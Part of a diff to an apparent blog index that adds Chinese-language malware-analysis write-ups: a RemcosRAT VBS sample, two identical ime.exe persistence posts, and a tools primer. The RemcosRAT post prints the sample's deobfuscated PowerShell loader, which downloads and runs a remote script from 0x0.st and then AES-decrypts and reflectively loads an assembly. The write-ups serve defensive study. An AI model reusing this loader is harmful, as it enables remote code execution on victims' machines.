@@ -276,7 +276,496 @@
       </tags>
   </entry>
   <entry>
-    <title>【惡意軟體分析】RemcosRAT Malware - 02</title>
+    <title>【惡意軟體分析】- 03</title>
+    <url>/posts/32167/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
+</blockquote>
+<font size='3'>
+在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+</font>
+
+<br>
+
+<hr>
+<span id="more"></span>
+
+
+<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
+<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
+</li>
+<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
+</li>
+<li><p><a href='https://bazaar.abuse.ch/sample/01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363/' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
+</li>
+<li><p><font size='3'>HASH256：<code>01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363</code></font></p>
+</li>
+</ul>
+<hr>
+<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
+<br>
+
+
+<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
+<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
+<li><font size='3'>Virustotal   → 檢查 hash</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
+<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
+<li><font size='3'>查看檔案資訊是否有可疑地方</font><ul>
+<li><font size='3'><code>CreateObject(&quot;Scripting.FileSystemObject&quot;)</code> ： 建立&#x2F;修改&#x2F;刪除檔案、寫入執行指令。</font></li>
+<li><font size='3'><code>Set kSPdG = YIEhr.CreateTextFile(YoSeb &amp; &quot;\&quot; &amp; randomVBSBatName, True)&quot;</code> ： 建立一個 bat 檔案。</font></li>
+</ul>
+</li>
+</ul>
+<p><img data-src='pe-studio-1.png' align='center' width='700' alt='知道該檔案確定是 PE32 格式'></img></p>
+<br>
+
+<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
+<br>
+
+<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<br>
+
+
+<hr>
+<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
+<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
+<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
+<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
+<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
+</ul>
+</li>
+</ul>
+<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
+<br>
+
+<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
+<li>檢查有無可疑的路徑、檔案。<ul>
+<li>找到一個可疑檔案 ( 名稱可以、副檔名不對、路徑不對、無憑證 )。</li>
+</ul>
+</li>
+</ul>
+<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
+<br>
+
+<hr>
+<h4 id="1️⃣-vbsEdit"><a href="#1️⃣-vbsEdit" class="headerlink" title="1️⃣ vbsEdit"></a>1️⃣ vbsEdit</h4><ul>
+<li><font size='3'>打開惡意程式</font></li>
+</ul>
+<p><img data-src='vba-edit-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
+<br>
+
+<p><img data-src='vba-edit-2.png' width='700' align='center' alt='使用 VBAEdit 查看代碼'></img></p>
+<br>
+
+<hr>
+<br>
+
+
+<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
+<li><p><font size='3'>該程式會偽裝成無害的檔案誘使受害者點擊。</font></p>
+</li>
+<li><p><font size='3'>移除 <code>C:\Users\ADMINI~1\AppData\Local\Temp\1\IXeqOHqsNh.bat</code></font></p>
+</li>
+<li><p><font size='3'>移除 <code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_7fff24c6.cmd </code></font></p>
+</li>
+</ul>
+<br>
+
+
+<hr>
+<br>
+
+<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
+<li><font size='3'> 整理一下代碼：<code>Pending</code></font><ul>
+<li><font size='3'>BASE64</font></li>
+<li><font size='3'>AES</font></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%FsxeI%s%FsxeI%e%FsxeI%t%FsxeI% &quot;&quot;TIZVOs=;</span><br><span class="line"></span><br><span class="line">$QfYeqOS=&#x27;Split&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ReadLines&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Decompress&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;MainModule&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CreateDecryptor&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CopyTo&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ChangeExtension&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;TransformFinalBlock&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ElementAt&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;GetCurrentProcess&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Invoke&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;EntryPoint&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">powershell -w hidden;</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;U1RSSU5HUkFORE9NaVNUUklOR1JBTkRPTWVTVFJJTkdSQU5ET014ICgoaVNUUklOR1JkRPTXdTVFJJTkdSQU5ET01yU1RSSU5HUkFORE9NIC1TVFJJTkdSQU5ET01VU1RSSU5HUkFORE9Nc1NUUklOR1JkRPTWVTVFJJTkdSQU5ET01CU1RSSU5HUkFORE9NYVNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NY1NUUklOR1JkRPTVVFJJTkdSQU5ET01hU1RSSU5HUkFORE9NclNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NblNUUklOR1JkRPTWdTVFJJTkdSQU5ET00gIlNUUklOR1JkRPTWhTVFJJTkdSQU5ET010dHBzU1RSSU5HUkFORE9NOlNUUklOR1JBTkRPTS9TVFJJTkdSQU5ET00vU1RSSU5HUkFORE9NMFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET00wU1RSSU5HUkFORE9NLlNUUklOR1JkRPTXNTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NL1NUUklOR1JkRPTThTVFJJTkdSQU5ET01aU1RSSU5HUkFORE9NRFNUUklOR1JkRPTWFTVFJJTkdSQU5ET00uU1RSSU5HUkFORE9NdFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;aWV4ICgoaXdyIC1Vc2VCYXNpY1BhcnNpbmcgImh0dHBzOi8vMHgwLnN0LzhaZXkucHMxIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">## 解碼過後</span><br><span class="line"></span><br><span class="line">iex (</span><br><span class="line">  (iwr -UseBasicParsing &quot;https://0x0.st/xxxx.ps1&quot;).Content.Replace(&#x27;ABC&#x27;,&#x27;&#x27;)</span><br><span class="line">) -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function decrypt_function($param_var)&#123;$aes_var=[System.Security.Cryptography.Aes]::Create();</span><br><span class="line"></span><br><span class="line">$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;</span><br><span class="line"></span><br><span class="line">$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;</span><br><span class="line"></span><br><span class="line">$aes_var.Key=[System.Convert]::FromBase64String(&#x27;ewMoxjcpzeNBZW19N7eS0/ZStjAsKH1ZQlG6Hp4+rlE=&#x27;);</span><br><span class="line"></span><br><span class="line">$aes_var.IV=[System.Convert]::FromBase64String(&#x27;GwaE+1wDAP4SIjKqb1sLhw==&#x27;);</span><br><span class="line"></span><br><span class="line">$FAPRA=$aes_var.($QfYeqOS[4])();</span><br><span class="line"></span><br><span class="line">$cJMDe=$FAPRA.($QfYeqOS[7])($param_var,0,$param_var.Length);</span><br><span class="line"></span><br><span class="line">$FAPRA.Dispose();</span><br><span class="line"></span><br><span class="line">$aes_var.Dispose();</span><br><span class="line"></span><br><span class="line">$cJMDe;</span><br><span class="line"></span><br><span class="line">&#125;function decompress_function($param_var)&#123;$OMBpZ=New-Object System.IO.MemoryStream(,$param_var);</span><br><span class="line"></span><br><span class="line">$ZMdDq=New-Object System.IO.MemoryStream;</span><br><span class="line"></span><br><span class="line">$ztAGx=New-Object System.IO.Compression.GZipStream($OMBpZ,[IO.Compression.CompressionMode]::($QfYeqOS[2]));</span><br><span class="line"></span><br><span class="line">$ztAGx.($QfYeqOS[5])($ZMdDq);</span><br><span class="line"></span><br><span class="line">$ztAGx.Dispose();</span><br><span class="line"></span><br><span class="line">$OMBpZ.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.ToArray();</span><br><span class="line"></span><br><span class="line">&#125;$YZNls=[System.IO.File]::($QfYeqOS[1])([Console]::Title);</span><br><span class="line"></span><br><span class="line">$eOuee=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::($QfYeqOS[8])($YZNls, 6).Substring(2))));</span><br><span class="line"></span><br><span class="line">[System.Reflection.Assembly]::Load([byte[]]$eOuee).($QfYeqOS[11]).($QfYeqOS[10])($null,$null);</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">kSPdG.writeline &quot;%egViW%s%egViW%e%egViW%t%egViW% &quot;&quot;JMEsIb=$host.UI.RawUI.WindowTitle=&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<!-- <img data-src='hide-malware.png' width='700' align='center' alt='待解析'></img> -->
+
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
+](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
+</ul>
+<br>]]></content>
+      <categories>
+        <category>analysis</category>
+      </categories>
+      <tags>
+        <tag>analysis</tag>
+        <tag>malware</tag>
+        <tag>RemcosRAT</tag>
+        <tag>vbs</tag>
+        <tag>Pending</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【惡意軟體分析】- 04</title>
+    <url>/posts/49126/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
+</blockquote>
+<font size='3'>
+在本練習中，我們將對 ime.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+</font>
+
+<br>
+
+<hr>
+<span id="more"></span>
+
+<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
+<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
+<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
+<li><font size='3'>MD5：<code>36536F8C42C258DCC23889DE6D72019E</code></font></li>
+</ul>
+<hr>
+<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
+<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
+<li><font size='3'>Virustotal   → 查看執行檔</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
+<li><font size='3'>針對檔案資訊進行初步查找</font></li>
+</ul>
+<p><img data-src='pe-studio-1.png' width='700' align='center' alt='查看 Strings'></img></p>
+<br>
+
+<p><img data-src='pe-studio-2.png' width='700' align='center' alt='查看 HASH'></img></p>
+<br>
+
+<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
+<br>
+
+
+<br>
+
+<hr>
+<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
+<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
+<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
+<li>監控程式的行為</li>
+</ul>
+<p><img data-src='process-monitor-1.png' width='700' align='center' alt='查看到有建立一個檔案'></img></p>
+<br>
+
+<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
+<li>查看有無可疑的路徑、檔案<ul>
+<li>明顯添加一個可疑檔案</li>
+</ul>
+</li>
+</ul>
+<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
+<br>
+
+<hr>
+<br>
+
+<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
+<li><font size='3'>建立 Windows NT 自動執行 ( <code>ime.exe</code> )，會在該資料夾建立一個 <code>ime.srg</code> 檔案。</font></li>
+<li><font size='3'>移除 <code>ime.exe</code> 、 <code>ime.srg</code> 。</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
+<li><font size='3'>分析 <code>ime.srg</code> 檔案 - <code>Pending</code></font></li>
+</ul>
+<p><img data-src='ime-srg.png' width='700' align='center' alt='待解析'></img></p>
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
+](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
+</ul>
+<br>]]></content>
+      <categories>
+        <category>analysis</category>
+      </categories>
+      <tags>
+        <tag>analysis</tag>
+        <tag>malware</tag>
+        <tag>exe</tag>
+        <tag>Pending</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【惡意軟體分析】- 05</title>
+    <url>/posts/40649/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
+</blockquote>
+<font size='3'>
+在本練習中，我們將對 ime.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+</font>
+
+<br>
+
+<hr>
+<span id="more"></span>
+
+<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
+<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
+<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
+<li><font size='3'>MD5：<code>36536F8C42C258DCC23889DE6D72019E</code></font></li>
+</ul>
+<hr>
+<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
+<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
+<li><font size='3'>Virustotal   → 查看執行檔</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
+<li><font size='3'>針對檔案資訊進行初步查找</font></li>
+</ul>
+<p><img data-src='pe-studio-1.png' width='700' align='center' alt='查看 Strings'></img></p>
+<br>
+
+<p><img data-src='pe-studio-2.png' width='700' align='center' alt='查看 HASH'></img></p>
+<br>
+
+<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
+<br>
+
+
+<br>
+
+<hr>
+<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
+<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
+<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
+<li>監控程式的行為</li>
+</ul>
+<p><img data-src='process-monitor-1.png' width='700' align='center' alt='查看到有建立一個檔案'></img></p>
+<br>
+
+<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
+<li>查看有無可疑的路徑、檔案<ul>
+<li>明顯添加一個可疑檔案</li>
+</ul>
+</li>
+</ul>
+<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
+<br>
+
+<hr>
+<br>
+
+<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
+<li><font size='3'>建立 Windows NT 自動執行 ( <code>ime.exe</code> )，會在該資料夾建立一個 <code>ime.srg</code> 檔案。</font></li>
+<li><font size='3'>移除 <code>ime.exe</code> 、 <code>ime.srg</code> 。</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
+<li><font size='3'>分析 <code>ime.srg</code> 檔案 - <code>Pending</code></font></li>
+</ul>
+<p><img data-src='ime-srg.png' width='700' align='center' alt='待解析'></img></p>
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
+](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
+</ul>
+<br>]]></content>
+      <categories>
+        <category>analysis</category>
+      </categories>
+      <tags>
+        <tag>analysis</tag>
+        <tag>malware</tag>
+        <tag>exe</tag>
+        <tag>Pending</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【惡意軟體分析】基礎概念篇</title>
+    <url>/posts/42213/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>轉職 ~~ 學習到 Malware Analysis 跟逆向分析的東西，把基礎概念與工具用途紀錄一下。</font></p>
+</blockquote>
+<hr>
+<span id="more"></span>
+
+
+<h2 id="📝-本篇說明紀錄兩個部分"><a href="#📝-本篇說明紀錄兩個部分" class="headerlink" title="📝 本篇說明紀錄兩個部分"></a><font size='3'>📝 本篇說明紀錄兩個部分</font></h2><ul>
+<li>Analysis Environment</li>
+<li>Analysis Step<ul>
+<li>Static Analysis</li>
+<li>Dynamic Analysis</li>
+<li>Reverse Engineering</li>
+</ul>
+</li>
+</ul>
+<br>
+
+<h2 id="📝-Analysis-Environment-分析環境"><a href="#📝-Analysis-Environment-分析環境" class="headerlink" title="📝 Analysis Environment ( 分析環境 )"></a>📝 Analysis Environment ( 分析環境 )</h2><hr>
+<ul>
+<li><font size='3'>最常見的就是 Windows ，大多的惡意程式都是針對 Windows 去設計。</font></li>
+<li><font size='3'>Remux Linux 的版本，裡面預載許多常用到的分析工具。</font></li>
+</ul>
+<br>
+
+<hr>
+<h2 id="🔥-Analysis-Step-🔥"><a href="#🔥-Analysis-Step-🔥" class="headerlink" title="🔥 Analysis Step 🔥"></a><font size='5' align='center'>🔥 Analysis Step 🔥</font></h2><hr>
+<br>
+
+
+<h3 id="📝-Analysis-Analysis"><a href="#📝-Analysis-Analysis" class="headerlink" title="📝 Analysis Analysis"></a><font size='5'>📝 Analysis Analysis</font></h3><hr>
+<ul>
+<li><font size='3'>不執行的去分析惡意程序的內容，針對 Windows 的話可以用下列工具</font><ul>
+<li><font size='3'><code>PE Studio</code> ：可以初步的做分析，查看 PE 資訊與 檔案的 strings。</font></li>
+<li><font size='3'><code>IDA</code> ：逆向標配，可以查看 assembly，需有組合語言的能力。</font></li>
+<li><font size='3'><code>Ghidra</code></font></li>
+<li><font size='3'><code>PE Bear</code> &#x2F;  <code>PE View</code> ：可以針對 PE 檔案格式做深入研究。</font></li>
+<li><font size='3'><code>oledump.py</code> ：針對 Office 格式 ( Word, Excel ) 分析裡面的 Macro。</font></li>
+<li><font size='3'><code>pdf-parser.py</code> ：針對 PDF 格式分析裡面的 Object。</font></li>
+</ul>
+</li>
+</ul>
+<br>
+
+
+<h3 id="📝-Dynamic-Analysis"><a href="#📝-Dynamic-Analysis" class="headerlink" title="📝 Dynamic Analysis"></a><font size='5' >📝 Dynamic Analysis</font></h3><hr>
+<ul>
+<li><font size='3'>靜態分析完了之後想驗證自己的想法，可以使用動態分析</font></li>
+<li><font size='3'>動態分析方法比較多種，但大致可以分成自動跟手動</font><ul>
+<li><font size='3'><code>Cuckoo</code> ：沙盒標配，資料相當完整，但偶而會被Anti-debug&#x2F;analysis的招式抓到直接不執行。</font></li>
+<li><font size='3'><code>ANY.RUN </code> ：可以直接跟沙盒內的 Windows VM 做互動。</font></li>
+</ul>
+</li>
+</ul>
+<br>
+
+<ul>
+<li><font size='3'>執行後去分析惡意程序的內容，針對 Windows 的話可以用下列工具</font><ul>
+<li><font size='3'><code>Process Hacker</code> ：記錄所有執行中的程式以及詳細內容 (Mutex, process handle…..) 一邊執行一邊看著，通常可以很好發現 Process Injection 的特徵。</font></li>
+<li><font size='3'><code>Process Explorer</code> ：記錄所有API Usage，但建議搭配視覺化工具像是ProcDOT。</font></li>
+<li><font size='3'><code>Wireshark</code> ：記錄所有網路封包。</font></li>
+<li><font size='3'><code>RegShot</code> ：對 Registry 做快照，通常在執行前與後進行快照，然後對比看是否有被修改。</font></li>
+<li><font size='3'><code>x64dbg</code> ：惡意程式分析、破解（Cracking）、程式錯誤診斷。</font></li>
+</ul>
+</li>
+</ul>
+<!-- INetSim - 在封閉的網路可以充當Server，支援各大常見protocol，已經內建在REMnux裡面。
+Apate DNS - 可以搭配 REMnux做使用，把所有網路Traffic都導向REMnux，並搭配INetSim做使用
+Fiddler - 超好用的Web proxy, 不用特別設定，就算在封閉環境內也可以看到未成功發出的Web request
+WinDBG  - Kernal mode debugger 
+dnSpy - 針對.NET的逆向工具，包含靜態跟動態分析功能 -->
+
+<br>
+
+
+<h3 id="📝-Reverse-Engineering"><a href="#📝-Reverse-Engineering" class="headerlink" title="📝 Reverse Engineering"></a><font size='5' >📝 Reverse Engineering</font></h3><hr>
+<ul>
+<li><font size='3'> 從已編譯的程式碼回溯分析其內部運作方式 的技術</font></li>
+<li><font size='3'>分析惡意程式（Malware Analysis）：找出病毒、木馬、勒索軟體的攻擊行為。</font></li>
+<li><font size='3'>破解軟體（Software Cracking）：繞過軟體授權、DRM、序號驗證。</font></li>
+<li><font size='3'>安全性分析（Security Research）：發現應用程式的漏洞（Exploit Development）。</font></li>
+<li><font size='3'>修復舊軟體（Legacy Software Maintenance）：當源碼遺失時，還原程式運作邏輯。</font></li>
+<li><font size='3'>常用逆向工程工具</font><ul>
+<li><font size='3'><code>IDA Pro</code> ：最強靜態分析、互動式反組譯	。</font></li>
+<li><font size='3'><code>Ghidra</code> ：NSA 開源逆向工具，支援多架構。</font></li>
+<li><font size='3'><code>RetDec</code> ：開源反編譯工具，可還原 C 程式碼</font></li>
+</ul>
+</li>
+</ul>
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> <a href="https://pentestwriteup.blogspot.com/2020/08/blog-post.html">惡意程式分析 - 常用工具篇</a> </font></li>
+</ul>
+]]></content>
+      <categories>
+        <category>analysis</category>
+      </categories>
+      <tags>
+        <tag>analysis</tag>
+        <tag>malware</tag>
+        <tag>base</tag>
+      </tags>
+  </entry>
+  <entry>
